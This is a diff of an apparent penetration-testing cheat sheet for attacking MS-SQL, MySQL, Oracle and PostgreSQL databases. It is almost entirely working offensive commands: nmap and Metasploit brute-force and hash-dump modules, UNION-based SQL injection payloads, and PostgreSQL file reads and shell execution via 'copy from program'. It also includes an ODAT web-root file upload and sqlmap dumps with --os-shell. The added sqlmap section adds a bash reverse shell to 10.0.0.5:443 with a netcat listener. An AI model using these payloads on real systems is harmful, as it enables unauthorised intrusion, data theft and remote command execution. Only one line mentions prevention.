@@ -1,15 +1,17 @@
 Databases
 
- 
+
+Structured Query Language (SQL)
+Can be prevent by doing input validation, parameterized queries, stored procedures, and implementing a Web Application Firewall (WAF).
+
 # MS-SQL
 
-Locate
+- Locate
 msf > use auxiliary/scanner/mssql/mssql_ping
-nmap -sU -Pn -n -T4 --open -p1434 <targetRange>
+nmap -Pn -n -T4 --open -p1434 -sU <target IP>
+nmap -Pn -n -T4 --open -p1434 -sU --script ms-sql-info, ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <target IP>
 
-nmap -p1433 --script ms-sql-info <targetIP>
-nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <targetIP>
-
+- Metasploit
 msf > use auxiliary/scanner/mssql/mssql_login
 msf > use auxiliary/admin/mssql/mssql_enum
 msf > use auxiliary/scanner/mssql/mssql_hashdump
@@ -38,18 +40,18 @@ In the lower pane, right-click on the records > Save Results As
 
 # MySQL
 
-mysql -h <IP> -u <username> -p <password>        Login remotely
-mysql -h 10.0.0.10 -u root -p toor
+mysql -h <target IP> -u <username> -p <password>     Login remotely
 
 CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
 CREATE DATABASE <database>;
 GRANT ALL PRIVILEGES ON <database>.* TO 'newuser'@'localhost';
 FLUSH PRIVILEGES;
 
-SHOW DATABASES;
-USE <database>;
-SHOW TABLES;
-SHOW FIELDS FROM <table>;
+show databases;
+use <database>;
+show tables;
+select * from <table>
+show fields from <table>;
 
 DELETE FROM <table> WHERE <field>="value";
 
@@ -92,11 +94,11 @@ UPDATE hostvulns SET tool="Nessus";
 
 # General.
 1 UNION SELECT 1,2,3,4
-1 UNION SELECT NULL,NULL,NULL,@@hostname         ubuntu
-1 UNION SELECT NULL,NULL,NULL,version()          5.7.17-0ubuntu0.16.04.2
-1 UNION SELECT NULL,NULL,NULL,current_user()     root@localhost
-1 UNION SELECT NULL,NULL,NULL,user()             root@localhost
-1 UNION SELECT NULL,NULL,NULL,UUID()             534c63c1-2e4a-11e9-bb88-00505692e5ab
+1 UNION SELECT NULL,NULL,NULL,@@hostname             ubuntu
+1 UNION SELECT NULL,NULL,NULL,version()              5.7.17-0ubuntu0.16.04.2
+1 UNION SELECT NULL,NULL,NULL,current_user()         root@localhost
+1 UNION SELECT NULL,NULL,NULL,user()                 root@localhost
+1 UNION SELECT NULL,NULL,NULL,UUID()                 534c63c1-2e4a-11e9-bb88-00505692e5ab
 
 # List all dbs.
 1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
@@ -194,20 +196,20 @@ Login > Profile > flag
    set SQL GRANT DBA TO <user>
    set SQL GRANT JAVASYSPRIV TO <user>
 
-6. select * from v$version;                      Oracle version
-   select * from dba_registry_history;           Oracle patch level
-   select * from all_users;                      Usernames
-   select owner,table_name from all_tables;      Tables
-   select * from session_roles;                  Session roles
-   desc utl_http                                 Describes database objects
+6. select * from v$version;                          Oracle version
+   select * from dba_registry_history;               Oracle patch level
+   select * from all_users;                          Usernames
+   select owner,table_name from all_tables;          Tables
+   select * from session_roles;                      Session roles
+   desc utl_http                                     Describes database objects
 
 http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535
 
 sqlplus user/password@target IP:1521/database
 sqlplus user/password@target IP:1521/database as sysdba
 
-select * from v$Version;                         Show the database version
-select * from user_role_privs;                   Check database user permissions
+select * from v$Version;                             Show the database version
+select * from user_role_privs;                       Check database user permissions
 
 ./odat.pydbmsxslprocessor -s <target IP> -d <db> -U <user> -P <password> --putFile 'C:\inetpub\wwwroot\' 'test.txt' /root/test.txt --sysdba
 curl https://target IP/test.txt
@@ -220,21 +222,21 @@ select username, passwd from pg_shadow;
 select current_database();
 create table test (input TEXT); copy test from '/etc/passwd'; select input from test;
 
-psql -U postgres -h <IP>                         Login with user 'postgres' and no password
-\l                                               List databases
-\du                                              List database users
-select pg_ls_dir('/etc');                        List directory contents of /etc
-\c postgres                                      Connect to the 'postgres' db
-\d                                               List of tables
+psql -U postgres -h <IP>                             Login with user 'postgres' and no password
+\l                                                   List databases
+\du                                                  List database users
+select pg_ls_dir('/etc');                            List directory contents of /etc
+\c postgres                                          Connect to the 'postgres' db
+\d                                                   List of tables
 
-create table tmp(data text);                     Create a table called 'tmp'
-copy tmp(data) from program 'ls -l /home';       Run a command in the shell and save the output
-select * from tmp;                               Print the contents of the table
+create table tmp(data text);                         Create a table called 'tmp'
+copy tmp(data) from program 'ls -l /home';           Run a command in the shell and save the output
+select * from tmp;                                   Print the contents of the table
 
 copy tmp from '/etc/passwd';
 select * from tmp;
 
-delete from tmp;                                 Clear the table
+delete from tmp;                                     Clear the table
 
 Replace 'ls -l /home' with whatever command you'd like to run.
 drop table tmp;
@@ -264,10 +266,28 @@ admin’;--
 
 # sqlmap
 
-Capture a login with Burp and save to req.txt
+- Use a target page
+sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch
 
-sqlmap -r req.txt --level=5 --risk=3
-sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                Show all dbs
-sqlmap -u "http://target/index.html?page=1" -D <db> --tables --dump --batch     Show all tables in a particular db
-sqlmap -u "http://target/index.html?page=1" -D <db> -T <table> --dump           Dump all data in a particular table
+- Use Burp, turn the Proxy intercept on.
+Send a form request with no data using the browser.
+Capture the request, right-click on the POST > Copy to file: tmp
+
+
+sqlmap.py -r tmp --force-ssl --batch --dbs --dump
+sqlmap.py -r tmp --force-ssl --batch -D <database> --tables
+sqlmap.py -r tmp --force-ssl --batch -D <database> -T <table> --dump
+sqlmap.py -r tmp --force-ssl --batch --os-cmd whoami
+sqlmap.py -r tmp --force-ssl --batch --os-cmd id
+sqlmap.py -r tmp --force-ssl --batch --os-shell
+
+os-shell> bash -c "bash -i >& /dev/tcp/10.0.0.5/443 0>&1"
+
+- Kali
+nc -lvpn 443
+python3 -V
+python3 -c 'import pty;pty.spawn("bash")'
+ctrl Z
+stty raw -echo; fg
+cd ~
 
